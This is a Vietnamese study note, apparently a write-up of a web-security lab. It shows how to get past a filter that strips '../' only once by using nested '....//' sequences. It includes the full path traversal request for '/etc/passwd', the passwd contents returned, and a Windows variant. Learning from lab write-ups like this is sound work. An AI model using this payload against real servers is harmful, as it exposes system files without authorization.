![[lab-path-traversal-nonrecursive.png]]
lab strip `../` nhưng chỉ strip 1 lần không đệ quy.

> [!NOTE] phân tích đề
> mình gửi `../` thì mất tiêu.
> gửi `/etc/passwd` tuyệt đối cũng bị chặn.
> sau khi quan sát gói tin này, mình thấy server replace `../` thành rỗng đúng 1 pass, nên mình nhét lồng `....//` để sau khi strip nó ghép lại thành `../`.

### hướng giải
- [ ] thử `../` confirm bị strip
- [ ] thử `....//` xem response
- [ ] tăng số nấc `....//....//....//etc/passwd`
- [ ] đọc `/etc/passwd`

### giải
mình gửi:

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: 0a3d11e504c8xxxx.web-security-academy.net
```

-> server strip `../` ở giữa `....//`.
-> `....//` => `../`.
-> chuỗi cuối thành `../../../etc/passwd`.
=> response trả về:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

-> lụm file.
=> solved.

liên quan:
- [[lys thuyet path traversal]]
- [[path traversal]]
- [[Lab-Path traversal absolute bypass]]
- [[Lab-Path traversal encoded]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> strip non-recursive là lỗi kinh điển.
> nên mình khi gặp filter strip là auto thử `....//`.
> hoặc `....\/` trên Windows.
